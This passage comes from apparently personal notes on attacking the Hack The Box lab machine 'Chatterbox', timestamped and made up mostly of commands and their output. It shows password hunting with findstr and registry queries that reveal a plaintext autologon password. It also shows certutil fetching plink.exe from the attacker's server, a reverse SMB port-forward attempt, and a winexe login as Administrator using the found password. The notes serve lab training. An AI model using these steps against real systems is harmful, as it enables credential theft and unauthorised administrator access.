  TCP    0.0.0.0:49153          0.0.0.0:0              LISTENING       716
  TCP    0.0.0.0:49154          0.0.0.0:0              LISTENING       912
  TCP    0.0.0.0:49155          0.0.0.0:0              LISTENING       436
  TCP    0.0.0.0:49156          0.0.0.0:0              LISTENING       1336
  TCP    0.0.0.0:49157          0.0.0.0:0              LISTENING       444
  TCP    10.10.10.74:139        0.0.0.0:0              LISTENING       4
  TCP    10.10.10.74:9255       0.0.0.0:0              LISTENING       3676
  TCP    10.10.10.74:9256       0.0.0.0:0              LISTENING       3676
  TCP    10.10.10.74:49162      10.10.16.21:1234       ESTABLISHED     3676
  TCP    [::]:135               [::]:0                 LISTENING       664
  TCP    [::]:445               [::]:0                 LISTENING       4
  TCP    [::]:49152             [::]:0                 LISTENING       352
  TCP    [::]:49153             [::]:0                 LISTENING       716
  TCP    [::]:49154             [::]:0                 LISTENING       912
  TCP    [::]:49155             [::]:0                 LISTENING       436
  TCP    [::]:49156             [::]:0                 LISTENING       1336
  TCP    [::]:49157             [::]:0                 LISTENING       444
  UDP    0.0.0.0:123            *:*                                    872
  UDP    0.0.0.0:500            *:*                                    912
  UDP    0.0.0.0:4500           *:*                                    912
  UDP    0.0.0.0:5355           *:*                                    1104
  UDP    10.10.10.74:137        *:*                                    4
  UDP    10.10.10.74:138        *:*                                    4
  UDP    10.10.10.74:1900       *:*                                    3332
  UDP    10.10.10.74:9256       *:*                                    3676
  UDP    10.10.10.74:53635      *:*                                    3332
  UDP    127.0.0.1:1900         *:*                                    3332
  UDP    127.0.0.1:53636        *:*                                    3332
  UDP    [::]:123               *:*                                    872
  UDP    [::]:500               *:*                                    912
  UDP    [::]:4500              *:*                                    912
  UDP    [::1]:1900             *:*                                    3332
  UDP    [::1]:53634            *:*                                    3332
```

```
4:29 PM 1/15/2023
C:\Windows\system32>findstr /si password *.txt *.config *.ini
findstr /si password *.txt *.config *.ini
WindowsPowerShell\v1.0\en-US\about_hash_tables.help.txt:          Msg1="Please enter your password."
WindowsPowerShell\v1.0\en-US\about_hash_tables.help.txt:          Msg1="Please enter your password.";
WindowsPowerShell\v1.0\en-US\about_hash_tables.help.txt:          >> Msg1="Please enter your password.";
WindowsPowerShell\v1.0\en-US\about_hash_tables.help.txt:          Msg1                    Please enter your password.
WindowsPowerShell\v1.0\en-US\about_hash_tables.help.txt:          Please enter your password.
WindowsPowerShell\v1.0\en-US\about_hash_tables.help.txt:          Msg1                           Please enter your password.
WindowsPowerShell\v1.0\en-US\about_hash_tables.help.txt:          Msg1                           Please enter your password.
WindowsPowerShell\v1.0\en-US\about_hash_tables.help.txt:          Msg1="Please enter your password."
WindowsPowerShell\v1.0\en-US\about_hash_tables.help.txt:        Msg1                           "Please enter your password."
WindowsPowerShell\v1.0\en-US\about_remote_FAQ.help.txt:    name and password credentials on the local computer or the credentials
WindowsPowerShell\v1.0\en-US\about_remote_troubleshooting.help.txt:    2. Verify that a password is set on the workgroup-based computer. If a
WindowsPowerShell\v1.0\en-US\about_remote_troubleshooting.help.txt:       password is not set or the password value is empty, you cannot run
WindowsPowerShell\v1.0\en-US\about_remote_troubleshooting.help.txt:       To set password for your user account, use User Accounts in Control
WindowsPowerShell\v1.0\en-US\about_Return.help.txt:          function ScreenPassword($instance)
WindowsPowerShell\v1.0\en-US\about_Return.help.txt:          foreach ($a in @(get-wmiobject win32_desktop)) { ScreenPassword($a) }
WindowsPowerShell\v1.0\en-US\about_Return.help.txt:      This script checks each user account. The ScreenPassword function returns 
WindowsPowerShell\v1.0\en-US\about_Return.help.txt:      the name of any user account that does not have a password-protected 
WindowsPowerShell\v1.0\en-US\about_Return.help.txt:      screen saver. If the screen saver is password protected, the function 
WindowsPowerShell\v1.0\en-US\about_Signing.help.txt:    The MakeCert.exe tool will prompt you for a private key password. The 
WindowsPowerShell\v1.0\en-US\about_Signing.help.txt:    password ensures that no one can use or access the certificate without
WindowsPowerShell\v1.0\en-US\about_Signing.help.txt:    your consent. Create and enter a password that you can remember. You will 
WindowsPowerShell\v1.0\en-US\about_Signing.help.txt:    use this password later to retrieve the certificate.
WindowsPowerShell\v1.0\en-US\about_Signing.help.txt:        6. Type a password, and then type it again to confirm.
WindowsPowerShell\v1.0\en-US\about_Signing.help.txt:        4. On the Password page, select "Enable strong private key protection",
WindowsPowerShell\v1.0\en-US\about_Signing.help.txt:           and then enter the password that you assigned during the export 
FINDSTR: Cannot open restore\MachineGuid.txt
```
```
4:37 PM 1/15/2023																																	# creds found here.

C:\Windows\System32>reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon
    ReportBootOk    REG_SZ    1
    Shell    REG_SZ    explorer.exe
    PreCreateKnownFolders    REG_SZ    {A520A1A4-1780-4FF6-BD18-167343C5AF16}
    Userinit    REG_SZ    C:\Windows\system32\userinit.exe,
    VMApplet    REG_SZ    SystemPropertiesPerformance.exe /pagefile
    AutoRestartShell    REG_DWORD    0x1
    Background    REG_SZ    0 0 0
    CachedLogonsCount    REG_SZ    10
    DebugServerCommand    REG_SZ    no
    ForceUnlockLogon    REG_DWORD    0x0
    LegalNoticeCaption    REG_SZ    
    LegalNoticeText    REG_SZ    
    PasswordExpiryWarning    REG_DWORD    0x5
    PowerdownAfterShutdown    REG_SZ    0
    ShutdownWithoutLogon    REG_SZ    0
    WinStationsDisabled    REG_SZ    0
    DisableCAD    REG_DWORD    0x1
    scremoveoption    REG_SZ    0
    ShutdownFlags    REG_DWORD    0x11
    DefaultDomainName    REG_SZ    
    DefaultUserName    REG_SZ    Alfred
    AutoAdminLogon    REG_SZ    1
    DefaultPassword    REG_SZ    Welcome1!

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon\GPExtensions
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon\AutoLogonChecked
```

```
4:43 PM 1/15/2023																												# said successful, but didnt pull over - going to use wesng next.
Attempting to pull winpeas over...
certutil -urlcache -f http://10.10.16.21:8000/plink.exe plink.exe
```

```
4:47 PM 1/15/2023
┌──(root㉿kali)-[/home/kali/Documents/transfer/wesng]																			# vulnerabilities pulled into chatterbox, gonna watch rest of walkthrough
└─# python wes.py sysinfo.txt > chatterbox.txt
```

```
5:03 PM 1/15/2023
Downloaded x86 version of plink.exe from this website since we have credentials now. https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html
```

```
5:04 PM 1/15/2023
┌──(root㉿kali)-[/home/kali/Downloads]
└─# ls
Chimichurri.exe  jbugs.ovpn  lab_JBugs.ovpn  plink.exe
                                                                     
┌──(root㉿kali)-[/home/kali/Downloads]
└─# python3 -m http.server                    
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

```
5:38 PM 1/15/2023																									# unable to pull files into temp directory, had to pull into users/alfred directory.
c:\Windows\Temp>cd c:\users\alfred
cd c:\users\alfred

c:\Users\Alfred>certutil -urlcache -f http://10.10.16.21:8000/plink.exe plink.exe
certutil -urlcache -f http://10.10.16.21:8000/plink.exe plink.exe
****  Online  ****
CertUtil: -URLCache command completed successfully.

c:\Users\Alfred>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 502F-F304

 Directory of c:\Users\Alfred

01/16/2023  03:38 AM    <DIR>          .
01/16/2023  03:38 AM    <DIR>          ..
12/10/2017  12:05 PM    <DIR>          Contacts
12/10/2017  06:50 PM    <DIR>          Desktop
12/10/2017  12:05 PM    <DIR>          Documents
12/10/2017  12:25 PM    <DIR>          Downloads
12/10/2017  12:05 PM    <DIR>          Favorites
12/10/2017  12:05 PM    <DIR>          Links
12/10/2017  12:05 PM    <DIR>          Music
12/10/2017  12:05 PM    <DIR>          Pictures
01/16/2023  03:38 AM           837,936 plink.exe
12/10/2017  12:05 PM    <DIR>          Saved Games
12/10/2017  12:05 PM    <DIR>          Searches
12/10/2017  12:05 PM    <DIR>          Videos
               1 File(s)        837,936 bytes
              13 Dir(s)   3,338,928,128 bytes free
```

```
5:46 PM 1/15/2023
──(root㉿kali)-[/home/kali/Documents/hackthebox/Chatterbox]											# on kali box before messing with plink we are going to edit ssh config to permit root logins.
└─# gedit /etc/ssh/sshd_config

	PermitRootLogin yes						#PermitRootLogin prohibit-password	# original    # changed to permit root login and saved
```

```	
5:49 PM 1/15/2023
(root㉿kali)-[/home/kali/Documents/hackthebox/Chatterbox]											# restarting service 
└─# service ssh restart       

┌──(root㉿kali)-[/home/kali/Documents/hackthebox/Chatterbox]											# ensuring ssh is started.
└─# service ssh start  


plink.exe -l kali -pw kali -R 445:127.0.0.1:445 192.168.128.129
```

```
6:15 PM 1/15/2023
c:\Users\Alfred>plink.exe -l kali -pw kali -R 445:127.0.0.1:445 10.10.16.21							# mine is not working, not really sure why
plink.exe -l kali -pw kali -R 445:127.0.0.1:445 10.10.16.21
FATAL ERROR: Network error: Connection timed out

c:\Users\Alfred>

																										# this is fucked righjt now my brain is fried calling it quits for now, come back later.
```

```
6:27 PM 1/15/2023
┌──(root㉿kali)-[/home/kali/Documents/hackthebox/Chatterbox]
└─# winexe -U Administrator%Welcome1! //10.10.10.74 "cmd.exe"											# had to coninuously hit enter and eventually got shell with winexe

Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>
C:\Windows\system32>
C:\Windows\system32>
C:\Windows\system32>
C:\Windows\system32>
C:\Windows\system32>whoami
whoami
chatterbox\administrator

C:\Windows\system32>
																									